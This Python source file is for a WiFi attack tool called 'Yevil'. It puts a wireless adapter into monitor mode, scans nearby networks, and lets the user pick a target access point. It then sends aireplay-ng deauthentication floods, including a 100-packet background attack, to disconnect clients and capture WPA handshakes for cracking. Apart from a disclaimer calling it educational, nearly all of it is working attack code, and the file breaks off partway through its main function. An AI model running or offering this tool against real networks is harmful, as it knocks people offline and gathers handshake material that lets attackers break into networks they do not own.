#!/usr/bin/env python3
"""
Yevil - WiFi Security Testing Tool
Advanced WiFi Security Testing Tool for Educational Purposes
Version: 2.0.0
"""

import os
import sys
import subprocess
import importlib
import time
import re
import json
import threading
import shutil
from datetime import datetime
from typing import List, Dict, Optional, Tuple
from pathlib import Path

# ============================================
# VIRTUAL ENVIRONMENT SETUP
# ============================================

VENV_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "yevil_env")

def setup_virtual_environment():
    """Create and setup virtual environment for Yevil"""
    print("\n[+] Setting up virtual environment for Yevil...")
    
    if os.path.exists(VENV_DIR):
        print("[+] Virtual environment already exists")
        return True
    
    try:
        print("[+] Creating virtual environment...")
        subprocess.run([sys.executable, '-m', 'venv', VENV_DIR], check=True)
        print("[+] Virtual environment created successfully!")
        return True
    except subprocess.CalledProcessError:
        print("[!] Failed to create virtual environment. Installing python3-venv...")
        try:
            subprocess.run(['sudo', 'apt-get', 'install', '-y', 'python3-venv'], check=True)
            subprocess.run([sys.executable, '-m', 'venv', VENV_DIR], check=True)
            print("[+] Virtual environment created successfully!")
            return True
        except:
            print("[!] Please install python3-venv manually:")
            print("    sudo apt-get install python3-venv")
            return False

def get_venv_python():
    """Get path to virtual environment Python"""
    if sys.platform == 'win32':
        return os.path.join(VENV_DIR, 'Scripts', 'python.exe')
    else:
        return os.path.join(VENV_DIR, 'bin', 'python')

def get_venv_pip():
    """Get path to virtual environment pip"""
    if sys.platform == 'win32':
        return os.path.join(VENV_DIR, 'Scripts', 'pip.exe')
    else:
        return os.path.join(VENV_DIR, 'bin', 'pip')

def install_in_venv(package):
    """Install package in virtual environment"""
    pip_path = get_venv_pip()
    try:
        subprocess.run([pip_path, 'install', package], check=True, capture_output=True)
        return True
    except:
        return False

def install_dependencies_venv():
    """Install all dependencies in virtual environment"""
    print("\n[+] Installing dependencies in virtual environment...")
    
    packages = ['scapy', 'wifi', 'colorama', 'tqdm', 'netifaces']
    
    pip_path = get_venv_pip()
    try:
        subprocess.run([pip_path, 'install', '--upgrade', 'pip'], check=True, capture_output=True)
    except:
        pass
    
    for package in packages:
        print(f"   Installing {package}...")
        if install_in_venv(package):
            print(f"   ✓ {package} installed")
        else:
            print(f"   ✗ Failed to install {package}")
            return False
    
    print("[+] All dependencies installed successfully!")
    return True

def check_system_deps():
    """Check system dependencies"""
    print("\n[+] Checking system dependencies...")
    
    system_packages = ['aircrack-ng', 'iw', 'wireless-tools']
    missing = []
    
    for pkg in system_packages:
        try:
            subprocess.run(['which', pkg], check=True, capture_output=True)
            print(f"   ✓ {pkg} installed")
        except:
            missing.append(pkg)
            print(f"   ✗ {pkg} missing")
    
    if missing:
        print(f"\n[!] Missing system packages: {', '.join(missing)}")
        try:
            subprocess.run(['sudo', 'apt-get', 'update', '-y'], check=True)
            subprocess.run(['sudo', 'apt-get', 'install', '-y'] + missing, check=True)
            print("[+] System packages installed successfully!")
        except:
            print("[!] Failed to install system packages")
            print("[!] Please run: sudo apt-get install " + ' '.join(missing))
            return False
    
    return True

# ============================================
# MAIN EXECUTION WITH VENV HANDLING
# ============================================

if not sys.executable.startswith(VENV_DIR):
    print("\n[+] Checking Python environment...")
    
    if os.geteuid() != 0:
        print("[!] This tool requires root privileges!")
        print("[!] Please run with: sudo python3 yevil.py")
        sys.exit(1)
    
    if not check_system_deps():
        print("[!] Please install system dependencies and try again.")
        sys.exit(1)
    
    if not setup_virtual_environment():
        print("[!] Failed to setup virtual environment")
        sys.exit(1)
    
    if not install_dependencies_venv():
        print("[!] Failed to install dependencies")
        sys.exit(1)
    
    venv_python = get_venv_python()
    if os.path.exists(venv_python):
        print("[+] Starting Yevil in virtual environment...")
        os.execv(venv_python, [venv_python] + sys.argv)
    else:
        print("[!] Virtual environment Python not found")
        sys.exit(1)

# ============================================
# NOW RUNNING IN VIRTUAL ENVIRONMENT
# ============================================

try:
    import scapy
    import wifi
    import colorama
    import tqdm
    import netifaces
except ImportError as e:
    print(f"[!] Error importing: {e}")
    print("[!] Installing missing packages in virtual environment...")
    install_dependencies_venv()
    print("[+] Restarting...")
    os.execv(sys.executable, sys.argv)

# ============================================
# IMPORTS
# ============================================

import scapy.all as scapy
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11ProbeReq
from scapy.layers.eap import EAPOL

# ============================================
# YEVIL BANNER
# ============================================

YEVILL_BANNER = """
\033[96m
╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║    ██╗   ██╗███████╗██╗   ██╗██╗██╗                          ║
║    ╚██╗ ██╔╝██╔════╝██║   ██║██║██║                          ║
║     ╚████╔╝ █████╗  ██║   ██║██║██║                          ║
║      ╚██╔╝  ██╔══╝  ╚██╗ ██╔╝██║██║                          ║
║       ██║   ███████╗ ╚████╔╝ ██║███████╗                     ║
║       ╚═╝   ╚══════╝  ╚═══╝  ╚═╝╚══════╝                     ║
║                                                               ║
║           WiFi Security Testing Tool v2.0.0                   ║
║           ⚠️  For Educational Purposes Only!                  ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝
\033[0m
"""

# ============================================
# COLOR CLASS
# ============================================

class Colors:
    """Color definitions for terminal"""
    red = '\033[91m'
    green = '\033[92m'
    yellow = '\033[93m'
    blue = '\033[94m'
    magenta = '\033[95m'
    cyan = '\033[96m'
    white = '\033[97m'
    reset = '\033[0m'
    bold = '\033[1m'
    
    @staticmethod
    def print_colored(text: str, color: str = 'white', bold: bool = False):
        """Print colored text"""
        style = Colors.bold if bold else ''
        print(f"{style}{getattr(Colors, color, '')}{text}{Colors.reset}")

# ============================================
# YEVIL TOOL CLASS
# ============================================

class YevilTool:
    """Yevil - Advanced WiFi Security Testing Tool"""
    
    def __init__(self):
        self.adapter = None
        self.available_adapters = []
        self.networks = []
        self.target_bssid = None
        self.target_channel = None
        self.handshake_captured = False
        self.running = True
        self.packet_count = 0
        
    def print_banner(self):
        """Display Yevil banner"""
        print(YEVILL_BANNER)
    
    def check_root(self):
        """Check if running as root"""
        if os.geteuid() != 0:
            Colors.print_colored("[!] This tool requires root privileges!", 'red', True)
            Colors.print_colored("[!] Please run with: sudo python3 yevil.py", 'yellow')
            sys.exit(1)
    
    def detect_adapters(self) -> List[str]:
        """Detect all available wireless adapters"""
        Colors.print_colored("\n[+] Detecting wireless adapters...", 'cyan', True)
        
        adapters = []
        try:
            result = subprocess.run(['iwconfig'], capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if 'IEEE 802.11' in line:
                    adapter = line.split()[0]
                    if adapter not in adapters:
                        adapters.append(adapter)
            
            result = subprocess.run(['ip', 'link', 'show'], capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if 'wlan' in line.lower() or 'wlp' in line.lower():
                    match = re.search(r':\s*(\w+)', line)
                    if match:
                        adapter = match.group(1)
                        if adapter not in adapters:
                            adapters.append(adapter)
            
            if os.path.exists('/sys/class/net/'):
                for device in os.listdir('/sys/class/net/'):
                    if device.startswith('wlan') or device.startswith('wlp'):
                        if device not in adapters:
                            adapters.append(device)
            
        except Exception as e:
            Colors.print_colored(f"[-] Error detecting adapters: {e}", 'red')
        
        self.available_adapters = adapters
        
        if adapters:
            Colors.print_colored(f"[+] Found {len(adapters)} adapter(s): {', '.join(adapters)}", 'green')
            return adapters
        else:
            Colors.print_colored("\n[!] No wireless adapters found!", 'yellow', True)
            Colors.print_colored("[!] Attach a wireless adapter for better performance", 'yellow')
            return []
    
    def set_monitor_mode(self, adapter: str) -> bool:
        """Set adapter to monitor mode automatically"""
        Colors.print_colored(f"\n[+] Setting {adapter} to monitor mode...", 'cyan', True)
        
        try:
            try:
                subprocess.run(['which', 'airmon-ng'], check=True, capture_output=True)
                result = subprocess.run(['sudo', 'airmon-ng', 'start', adapter], 
                                      capture_output=True, text=True)
                
                for line in result.stdout.split('\n'):
                    if 'mon' in line and adapter in line:
                        match = re.search(r'(\w+mon\d*)', line)
                        if match:
                            self.adapter = match.group(1)
                            Colors.print_colored(f"[+] Monitor mode enabled on {self.adapter}", 'green')
                            return True
                        
            except subprocess.CalledProcessError:
                commands = [
                    f'sudo ip link set {adapter} down',
                    f'sudo iw dev {adapter} set type monitor',
                    f'sudo ip link set {adapter} up'
                ]
                for cmd in commands:
                    subprocess.run(cmd.split(), check=True, capture_output=True)
                
                self.adapter = adapter
                Colors.print_colored(f"[+] Monitor mode enabled on {self.adapter}", 'green')
                return True
                
        except Exception as e:
            Colors.print_colored(f"[-] Failed to set monitor mode: {e}", 'red')
            return False
        
        return False
    
    def scan_animation(self):
        """Display scanning animation"""
        frames = [
            """
\033[96m ╔═══════════════════════════════════════╗
 ║    🔍 YEVIL SCANNING NETWORKS      ║
 ║    WiFi  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄    ║
 ║     ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄    ║
 ║        ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄     ║
 ║           ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄      ║
 ╚═══════════════════════════════════════╝\033[0m
            """,
            """
\033[96m ╔═══════════════════════════════════════╗
 ║    📡 YEVIL SCANNING NETWORKS      ║
 ║     ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ║
 ║  WiFi ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ║
 ║       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ║
 ║         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄    ║
 ╚═══════════════════════════════════════╝\033[0m
            """
        ]
        
        for i in range(3):
            for frame in frames:
                sys.stdout.write('\033[2J\033[H')
                sys.stdout.write(frame)
                sys.stdout.flush()
                time.sleep(0.3)
    
    def parse_airodump_csv(self, filename: str) -> List[Dict]:
        """Parse airodump-ng CSV output"""
        networks = []
        try:
            with open(filename, 'r') as f:
                lines = f.readlines()
            
            network_start = False
            for i, line in enumerate(lines):
                if 'BSSID' in line and 'PWR' in line:
                    network_start = i + 1
                    break
            
            if not network_start:
                return networks
            
            for line in lines[network_start:]:
                if 'Station' in line:
                    break
                    
                parts = line.strip().split(',')
                if len(parts) >= 10 and parts[0] and parts[0] != 'BSSID':
                    network = {
                        'bssid': parts[0].strip(),
                        'first_seen': parts[1].strip(),
                        'last_seen': parts[2].strip(),
                        'channel': parts[3].strip(),
                        'speed': parts[4].strip(),
                        'privacy': parts[5].strip(),
                        'cipher': parts[6].strip(),
                        'authentication': parts[7].strip(),
                        'power': parts[8].strip(),
                        'beacons': parts[9].strip(),
                        'ssid': parts[13].strip() if len(parts) > 13 else '<Hidden>'
                    }
                    networks.append(network)
            
        except Exception as e:
            Colors.print_colored(f"[-] Error parsing CSV: {e}", 'red')
        
        return networks
    
    def scan_networks(self) -> List[Dict]:
        """Scan networks using airodump-ng"""
        Colors.print_colored("\n" + "="*60, 'cyan', True)
        Colors.print_colored("📡 YEVIL SCANNING NETWORKS", 'cyan', True)
        Colors.print_colored("="*60, 'cyan')
        
        if not self.adapter:
            Colors.print_colored("[-] No adapter in monitor mode!", 'red')
            return []
        
        self.scan_animation()
        Colors.print_colored(f"\n[+] Scanning with airodump-ng on {self.adapter} --band abg", 'blue')
        
        try:
            process = subprocess.Popen(
                f'sudo airodump-ng {self.adapter} --band abg --write /tmp/scan --output-format csv --write-interval 1'.split(),
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            for i in range(15, 0, -1):
                Colors.print_colored(f"   Scanning... {i} seconds remaining", 'yellow', True)
                time.sleep(1)
            
            process.terminate()
            time.sleep(1)
            
            if os.path.exists('/tmp/scan-01.csv'):
                self.networks = self.parse_airodump_csv('/tmp/scan-01.csv')
                self.display_networks(self.networks)
                return self.networks
            else:
                Colors.print_colored("[-] No scan results found!", 'red')
                return []
                
        except Exception as e:
            Colors.print_colored(f"[-] Error scanning: {e}", 'red')
            return []
    
    def display_networks(self, networks: List[Dict]):
        """Display networks in formatted table"""
        if not networks:
            Colors.print_colored("\n[-] No networks found!", 'red')
            return
        
        Colors.print_colored("\n" + "="*100, 'cyan')
        Colors.print_colored("📋 AVAILABLE NETWORKS", 'cyan', True)
        Colors.print_colored("="*100, 'cyan')
        
        print(f"{'#':<4} {'SSID':<25} {'BSSID':<18} {'CH':<4} {'PWR':<6} {'ENC':<8} {'AUTH':<12} {'PACKETS':<8}")
        print("-"*100)
        
        for i, net in enumerate(networks, 1):
            ssid = net['ssid'][:25] if net['ssid'] != '<Hidden>' else '<Hidden>'
            color = 'green' if net['privacy'] != 'OPN' else 'yellow'
            Colors.print_colored(
                f"{i:<4} {ssid:<25} {net['bssid']:<18} {net['channel']:<4} {net['power']:<6} "
                f"{net['privacy']:<8} {net['authentication']:<12} {net['beacons']:<8}",
                color
            )
        
        print("="*100)
        Colors.print_colored(f"Total Networks: {len(networks)}", 'cyan', True)
    
    def select_target(self) -> Tuple[str, str]:
        """Select target network"""
        if not self.networks:
            Colors.print_colored("[-] No networks available. Please scan first.", 'red')
            return None, None
        
        Colors.print_colored("\n" + "="*60, 'cyan', True)
        Colors.print_colored("🎯 YEVIL - SELECT TARGET NETWORK", 'cyan', True)
        Colors.print_colored("="*60, 'cyan')
        
        while True:
            try:
                choice = input(f"\n[?] Enter network number (1-{len(self.networks)}): ")
                idx = int(choice) - 1
                
                if 0 <= idx < len(self.networks):
                    target = self.networks[idx]
                    self.target_bssid = target['bssid']
                    self.target_channel = target['channel']
                    
                    Colors.print_colored(f"\n[+] Target selected:", 'green', True)
                    Colors.print_colored(f"   SSID: {target['ssid']}", 'green')
                    Colors.print_colored(f"   BSSID: {target['bssid']}", 'green')
                    Colors.print_colored(f"   Channel: {target['channel']}", 'green')
                    Colors.print_colored(f"   Encryption: {target['privacy']} {target['authentication']}", 'green')
                    
                    return self.target_bssid, self.target_channel
                else:
                    Colors.print_colored("[-] Invalid selection!", 'red')
                    
            except ValueError:
                Colors.print_colored("[-] Please enter a valid number!", 'red')
    
    def capture_packets(self, bssid: str, channel: str):
        """Capture packets and handshake"""
        Colors.print_colored("\n" + "="*60, 'cyan', True)
        Colors.print_colored("📡 YEVIL - CAPTURING PACKETS", 'cyan', True)
        Colors.print_colored("="*60, 'cyan')
        
        if not bssid or not channel:
            Colors.print_colored("[-] No target selected!", 'red')
            return
        
        Colors.print_colored(f"\n[?] Target AP: {bssid} (Channel: {channel})", 'yellow')
        capture_handshake = input("\n[?] Capture handshake? (y/n): ").lower().strip() == 'y'
        
        try:
            packet_count = int(input("[?] Number of deauth packets (default: 10): ") or "10")
        except ValueError:
            packet_count = 10
        
        Colors.print_colored(f"\n[+] Setting channel to {channel}", 'blue')
        subprocess.run(['sudo', 'iwconfig', self.adapter, 'channel', str(channel)])
        
        Colors.print_colored(f"\n[+] Starting packet capture on {self.adapter}", 'blue')
        
        timestamp = int(time.time())
        pcap_file = f"/tmp/yevil_capture_{timestamp}"
        
        cmd = f'sudo airodump-ng {self.adapter} --bssid {bssid} -c {channel} --write {pcap_file}'
        capture_process = subprocess.Popen(cmd.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        Colors.print_colored(f"\n[+] Starting deauth attack with {packet_count} packets...", 'yellow', True)
        
        deauth_cmd = [
            'sudo', 'aireplay-ng', '-0', str(packet_count),
            '-a', bssid,
            '--ignore-negative-one',
            self.adapter
        ]
        
        try:
            deauth_process = subprocess.Popen(
                deauth_cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            Colors.print_colored("\n[+] Deauth attack in progress...", 'yellow')
            Colors.print_colored("[+] Disconnecting clients to capture handshake...", 'yellow')
            
            deauth_process.wait(timeout=30)
            
            Colors.print_colored("\n[+] Checking for handshake...", 'blue')
            
            try:
                result = subprocess.run(['aircrack-ng', f'{pcap_file}-01.cap'], 
                                      capture_output=True, text=True)
                handshake_found = 'WPA (1 handshake)' in result.stdout or 'WPA handshake' in result.stdout
            except:
                handshake_found = False
            
            if handshake_found:
                Colors.print_colored("\n" + "="*60, 'green', True)
                Colors.print_colored("✅ HANDSHAKE CAPTURED SUCCESSFULLY!", 'green', True)
                Colors.print_colored("="*60, 'green', True)
                self.handshake_captured = True
            else:
                Colors.print_colored("\n[!] No handshake captured yet. Try again with more packets.", 'yellow')
                self.handshake_captured = False
            
            capture_process.terminate()
            self.show_packet_stats(pcap_file)
            
        except subprocess.TimeoutExpired:
            Colors.print_colored("[-] Deauth attack timed out!", 'red')
            deauth_process.kill()
        except Exception as e:
            Colors.print_colored(f"[-] Error during capture: {e}", 'red')
        finally:
            capture_process.terminate()
    
    def show_packet_stats(self, pcap_file: str):
        """Show packet statistics"""
        Colors.print_colored("\n📊 YEVIL - PACKET STATISTICS", 'cyan', True)
        Colors.print_colored("="*60, 'cyan')
        
        try:
            result = subprocess.run(['capinfos', f'{pcap_file}-01.cap'], 
                                  capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if 'Number of packets' in line or 'File size' in line:
                    Colors.print_colored(f"   {line.strip()}", 'white')
        except:
            Colors.print_colored("   Could not display packet statistics", 'yellow')
    
    def run_deauth_background(self, bssid: str, channel: str):
        """Run deauth in background"""
        Colors.print_colored("\n" + "="*60, 'cyan', True)
        Colors.print_colored("🔄 YEVIL - BACKGROUND DEAUTH ATTACK", 'cyan', True)
        Colors.print_colored("="*60, 'cyan')
        
        try:
            packet_count = 100
            Colors.print_colored(f"\n[+] Running deauth in background...", 'yellow')
            Colors.print_colored(f"   Target: {bssid}", 'blue')
            Colors.print_colored(f"   Channel: {channel}", 'blue')
            Colors.print_colored(f"   Packets: {packet_count}", 'blue')
            
            subprocess.run(['sudo', 'iwconfig', self.adapter, 'channel', str(channel)])
            
            cmd = ['sudo', 'aireplay-ng', '-0', str(packet_count), '-a', bssid, self.adapter]
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            
            Colors.print_colored("\n[+] Deauth attack running in background...", 'yellow')
            Colors.print_colored("[+] Press Ctrl+C to stop", 'yellow')
            
            def show_progress():
                while process.poll() is None:
                    Colors.print_colored("   • Sending deauth packets...", 'cyan')
                    time.sleep(2)
            
            progress_thread = threading.Thread(target=show_progress)
            progress_thread.daemon = True
            progress_thread.start()
            process.wait()
            
            Colors.print_colored("\n[+] Deauth attack completed", 'green')
            
        except KeyboardInterrupt:
            Colors.print_colored("\n[+] Stopped by user", 'yellow')
        except Exception as e:
            Colors.print_colored(f"[-] Error: {e}", 'red')
    
    def show_status(self):
        """Show current status"""
        Colors.print_colored("\n📊 YEVIL - CURRENT STATUS", 'cyan', True)
        Colors.print_colored("="*60, 'cyan')
        
        Colors.print_colored(f"Adapter: {self.adapter or 'Not set'}", 'white')
        Colors.print_colored(f"Target AP: {self.target_bssid or 'Not selected'}", 'white')
        Colors.print_colored(f"Channel: {self.target_channel or 'Not selected'}", 'white')
        Colors.print_colored(f"Networks found: {len(self.networks)}", 'white')
        Colors.print_colored(f"Handshake captured: {'Yes' if self.handshake_captured else 'No'}", 'white')
    
    def view_captured_packets(self):
        """View captured packets"""
        try:
            import glob
            cap_files = glob.glob('/tmp/yevil_capture_*.cap')
            
            if not cap_files:
                Colors.print_colored("[-] No captured packets found!", 'red')
                return
            
            Colors.print_colored("\n📁 YEVIL - CAPTURED PACKETS", 'cyan', True)
            Colors.print_colored("="*60, 'cyan')
            
            for i, file in enumerate(cap_files, 1):
                size = os.path.getsize(file) / 1024
                Colors.print_colored(f"{i}. {os.path.basename(file)} ({size:.1f} KB)", 'white')
            
            choice = input("\n[?] View packet details? (y/n): ").lower().strip()
            if choice == 'y':
                try:
                    idx = int(input("[?] Enter file number: ")) - 1
                    if 0 <= idx < len(cap_files):
                        subprocess.run(['capinfos', cap_files[idx]])
                except:
                    Colors.print_colored("[-] Invalid selection!", 'red')
                    
        except Exception as e:
            Colors.print_colored(f"[-] Error viewing packets: {e}", 'red')
    
    def show_about(self):
        """Show about information"""
        Colors.print_colored("\n" + "="*60, 'cyan', True)
        Colors.print_colored("ℹ️  ABOUT YEVIL", 'cyan', True)
        Colors.print_colored("="*60, 'cyan')
        
        Colors.print_colored(f"\nYevil v2.0.0", 'yellow', True)
        Colors.print_colored("WiFi Security Testing Tool", 'white')
        Colors.print_colored("\n📖 Purpose:", 'yellow', True)
        Colors.print_colored("   Educational tool to learn about WiFi security", 'white')
        Colors.print_colored("\n🔧 Features:", 'yellow', True)
        Colors.print_colored("   • Automatic adapter detection", 'white')
        Colors.print_colored("   • Network scanning with airodump-ng", 'white')
        Colors.print_colored("   • Handshake capture and analysis", 'white')
        Colors.print_colored("\n⚠️  Legal Disclaimer:", 'red', True)
        Colors.print_colored("   This tool is for EDUCATIONAL PURPOSES ONLY!", 'red')
        Colors.print_colored("   Only use on networks you own or have permission to test.", 'red')
        
        input("\nPress Enter to continue...")
    
    def cleanup(self):
        """Cleanup temporary files"""
        try:
            subprocess.run(['rm', '-f', '/tmp/scan-01.csv', '/tmp/yevil_capture_*.cap'], 
                         capture_output=True)
            if self.adapter and 'mon' in self.adapter:
                subprocess.run(['sudo', 'airmon-ng', 'stop', self.adapter], 
                             capture_output=True)
        except:
            pass
    
    def main_menu(self):
        """Main menu interface"""
        while self.running:
            Colors.print_colored("\n" + "="*60, 'cyan', True)
            Colors.print_colored("🔒 YEVIL - WiFi Security Testing Tool", 'cyan', True)
            Colors.print_colored("="*60, 'cyan')
            
            if self.adapter:
                Colors.print_colored(f"📡 Adapter: {self.adapter} (Monitor Mode)", 'green')
            else:
                Colors.print_colored("📡 No adapter in monitor mode!", 'red')
            
            Colors.print_colored("\n📋 YEVIL MENU", 'yellow', True)
            print("1.  Detect & Setup Wireless Adapter")
            print("2.  Scan Networks (airodump-ng --band abg)")
            print("3.  Select Target Network")
            print("4.  Capture Packets & Handshake")
            print("5.  Run Background Deauth Attack")
            print("6.  Show Current Status")
            print("7.  View Captured Packets")
            print("8.  About Yevil")
            print("9.  Exit")
            
            choice = input("\n[?] Select option: ")
            
            if choice == '1':
                adapters = self.detect_adapters()
                if adapters:
                    Colors.print_colored(f"\n[+] Available adapters:", 'cyan')
                    for i, adapter in enumerate(adapters, 1):
                        Colors.print_colored(f"   {i}. {adapter}", 'white')
                    
                    try:
                        choice_adapt = input("\n[?] Select adapter number: ")
                        idx = int(choice_adapt) - 1
                        if 0 <= idx < len(adapters):
                            if self.set_monitor_mode(adapters[idx]):
                                Colors.print_colored("[+] Adapter ready!", 'green')
                            else:
                                Colors.print_colored("[-] Failed to set monitor mode!", 'red')
                        else:
                            Colors.print_colored("[-] Invalid selection!", 'red')
                    except ValueError:
                        Colors.print_colored("[-] Please enter a valid number!", 'red')
                else:
                    Colors.print_colored("\n[!] No adapters found. Attach wireless adapter.", 'yellow')
                    
            elif choice == '2':
                if self.adapter:
                    self.scan_networks()
                else:
                    Colors.print_colored("[-] No adapter in monitor mode!", 'red')
                    
            elif choice == '3':
                if self.networks:
                    self.select_target()
                else:
                    Colors.print_colored("[-] No networks available! Please scan first.", 'red')
                    
            elif choice == '4':
                if self.target_bssid and self.target_channel:
                    self.capture_packets(self.target_bssid, self.target_channel)
                else:
                    Colors.print_colored("[-] No target selected!", 'red')
                    
            elif choice == '5':
                if self.target_bssid and self.target_channel:
                    self.run_deauth_background(self.target_bssid, self.target_channel)
                else:
                    Colors.print_colored("[-] No target selected!", 'red')
                    
            elif choice == '6':
                self.show_status()
                
            elif choice == '7':
                self.view_captured_packets()
                
            elif choice == '8':
                self.show_about()
                
            elif choice == '9':
                self.running = False
                self.cleanup()
                Colors.print_colored("\n[+] Goodbye! Stay ethical!", 'cyan', True)
                break
                
            else:
                Colors.print_colored("[-] Invalid option!", 'red')

# ============================================
# MAIN FUNCTION
# ============================================

def main():
    """Main entry point"""
    tool = YevilTool()
    tool.print_banner()
    tool.check_root()
    
    # Auto-detect adapter
    adapters = tool.detect_adapters()
    if adapters:
        Colors.print_colored(f"\n[+] Found adapter: {adapters[0]}", 'green')
        if tool.set_monitor_mode(adapters[0]):
            Colors.print_colored("[+] Auto-setup complete!", 'green')
        else:
            Colors.print_colored("[!] Manual
